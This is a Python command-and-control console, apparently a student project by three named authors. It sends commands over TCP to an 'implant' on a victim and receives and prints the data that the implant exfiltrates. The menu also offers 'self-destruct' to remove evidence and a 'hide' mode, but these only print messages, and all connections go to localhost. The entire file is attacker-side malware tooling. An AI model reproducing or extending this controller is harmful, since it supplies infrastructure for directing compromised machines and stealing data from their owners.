import colorama
from colorama import Fore, Back, Style
import socket
import sys

# Create a TCP/IP socket
c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('localhost', 9999)
c2_socket.bind(server_address)

colorama.init(autoreset=True)
exit = False

print('########################################################')
print('##                                                    ##')
print('##           COMMAND AND CONTROL PROGRAM              ##')
print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
print('##                                                    ##')
print('########################################################')

def recieve_exfil():
    # Wait for a connection
    print("waiting for a connection")
    connection, client_address = c2_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(100)
            if data:
                print(data)
            else:
                print("----------------")
                break
            
    finally:
        # Clean up the connection
        connection.close()

def send_implant(comm):
    #Send comm command to victim
    implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    implant_server_address = ('localhost', 10000)
    implant_socket.connect(implant_server_address)
    implant_socket.sendall(str.encode(comm))
    implant_socket.close()

while(not exit):
    print("Options:")
    print("1. Self-destruct (clears implant and removes all evidence)")
    print("2. Hide")
    print("3. Exfil")
    print("4. Exit")
    print(f"{Fore.GREEN}What would you like to do:")
    choice = input(">>")
    if choice == '1':
        print("Self-destruct initiated")
        print("Removing all evidence")

    elif choice == '2':
        print("Hiding")
        print("Halting exfil and awaiting further commands")

    elif choice == '3':
        print("Exfil initiated")
        
        #Listen for the Responses
        c2_socket.listen(1)
        exfil = True
        while(exfil == True):
            #Send command to exfiltrate
            send_implant('3')
            #Recieve the exfil
            recieve_exfil()
            print("Press n to end: any other key to continue")
            c = input(">>")
            if(c == 'n'):
                break
            
        

    elif choice == '4' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
        exit = True
        print("Exiting the C2 instance")
        print("Implant is still running - connect to it again later")

    else:
        print("Unrecognized input")

        
    